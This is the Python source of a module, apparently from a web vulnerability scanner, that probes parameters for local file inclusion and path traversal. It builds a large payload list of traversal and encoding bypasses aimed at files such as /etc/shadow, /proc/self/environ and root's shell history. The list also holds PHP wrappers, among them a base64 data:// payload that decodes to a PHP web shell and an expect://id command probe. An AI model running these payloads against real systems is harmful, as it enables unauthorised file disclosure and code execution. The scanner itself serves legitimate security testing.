"""SentinelX module [09]: LFI / Path Traversal.

Real implementation: 250+ payloads (Linux/Windows paths, PHP wrappers,
traversal bypasses). Detection via content signatures (passwd, win.ini,
base64-decoded php filter). Safe mode: read-only payloads.
"""

from __future__ import annotations

import base64
import re
from urllib.parse import urlencode as _urlencode, quote

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response


LINUX_FILES = [
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
    "/proc/self/environ", "/proc/self/cmdline", "/proc/version",
    "/proc/self/status", "/proc/self/fd/0",
    "/var/log/auth.log", "/var/log/apache2/access.log",
    "/var/log/nginx/access.log", "/var/log/syslog",
    "/root/.bash_history", "/etc/crontab",
    "/etc/nginx/nginx.conf", "/etc/apache2/apache2.conf",
    "/etc/mysql/my.cnf", "/etc/passwd",
]
WINDOWS_FILES = [
    "C:/Windows/win.ini", "C:/boot.ini",
    "C:/Windows/System32/drivers/etc/hosts",
    "C:/Windows/System32/inetsrv/config/applicationHost.config",
    "C:/Windows/win.ini",
]
PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==",
    "expect://id",
]

TRAVERSALS = [
    "../", "..\\/", "....//", "..%2f", "%2e%2e%2f",
    "..%c0%af", "%c0%ae%c0%ae/", ".....///",
]

# (regex, label, needs_b64_decode)
SIGNATURES = [
    (re.compile(r"root:x:0:0:"), "Linux /etc/passwd", False),
    (re.compile(r"\[extensions\]"), "Windows win.ini", False),
    (re.compile(r"\[fonts\]"), "Windows win.ini", False),
    (re.compile(r"Volume Serial Number", re.I), "Windows dir output", False),
    (re.compile(r"127\.0\.0\.1\s+localhost"), "hosts file", False),
]


def _b64_candidates(text: str) -> list[str]:
    out = []
    for m in re.finditer(r"[A-Za-z0-9+/]{100,}={0,2}", text):
        try:
            out.append(base64.b64decode(m.group(0)).decode("utf-8", "replace"))
        except Exception:
            pass
    return out


def detect_lfi(body: str) -> str | None:
    for rx, label, _ in SIGNATURES:
        if rx.search(body):
            return label
    for decoded in _b64_candidates(body):
        for rx, label, _ in SIGNATURES:
            if rx.search(decoded):
                return f"{label} (via php://filter base64)"
        if "<?php" in decoded or "<?=" in decoded:
            return "PHP source disclosed (via php://filter base64)"
    return None


def build_payloads() -> list[str]:
    payloads: list[str] = []
    for depth in (1, 2, 3, 4, 6, 8):
        for trav in TRAVERSALS:
            for f in LINUX_FILES:
                payloads.append(trav * depth + f.lstrip("/"))
    for depth in (1, 3, 5):
        for f in WINDOWS_FILES:
            payloads.append("../" * depth + f)
            payloads.append("..\\" * depth + f.replace("/", "\\"))
    payloads.extend(PHP_WRAPPERS)
    # null byte + truncation variants (subset to keep request count sane)
    for f in LINUX_FILES[:6]:
        payloads.append("../../.." + f + "%00")
        payloads.append("../../.." + f + "%00.jpg")
    # dedupe
    seen, out = set(), []
    for p in payloads:
        if p not in seen:
            seen.add(p); out.append(p)
    return out


PAYLOADS = build_payloads()  # 250+

REMEDIATION_LFI = (
    "Never pass user input to file operations. Use an allowlist of permitted "
    "files, strip path separators, resolve canonical paths and verify they stay "
    "inside the intended directory (chroot/jail). Disable dangerous PHP wrappers "
    "(allow_url_include=Off)."
)


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    if not params:
        return findings
    headers = {"User-Agent": config.user_agent}
    # only test params that look file-ish, else test all (bounded)
    fileish = [p for p in params if re.search(r"file|path|page|include|template|view|doc|name", p, re.I)]
    targets = fileish or list(params)[:2]

    for param in targets:
        # baseline to avoid flagging pages that already contain signatures
        p0 = dict(params)
        if method == "GET":
            base_url = url + ("&" if "?" in url else "?") + _urlencode(p0)
            base_resp = await client.get(base_url)
        else:
            base_resp = await client.post(url, data=p0)
            base_url = url
        base_sig = detect_lfi(base_resp.text) if base_resp else None

        for payload in PAYLOADS:
            p = dict(params); p[param] = payload
            if method == "GET":
                full = url + ("&" if "?" in url else "?") + _urlencode(p)
                resp = await client.get(full)
                body_sent = None
            else:
                resp = await client.post(url, data=p)
                full, body_sent = url, _urlencode(p).encode()
            if not resp:
                continue
            sig = detect_lfi(resp.text)
            if sig and sig != base_sig:
                ev = Evidence(
                    request_raw=raw_request(method, full, headers, body_sent),
                    response_raw=raw_response(resp.status_code, dict(resp.headers), resp.content),
                    proof=f"File content signature detected: {sig}",
                )
                findings.append(Finding(
                    type="Path Traversal", subtype="local-file-inclusion",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                    confidence=0.93, url=full, method=method, param=param,
                    payload=payload, evidence=ev, cwe="CWE-22",
                    owasp="A01:2021 – Broken Access Control",
                    remediation=REMEDIATION_LFI,
                    references=["https://owasp.org/www-community/attacks/Path_Traversal"],
                ))
                break
    return findings
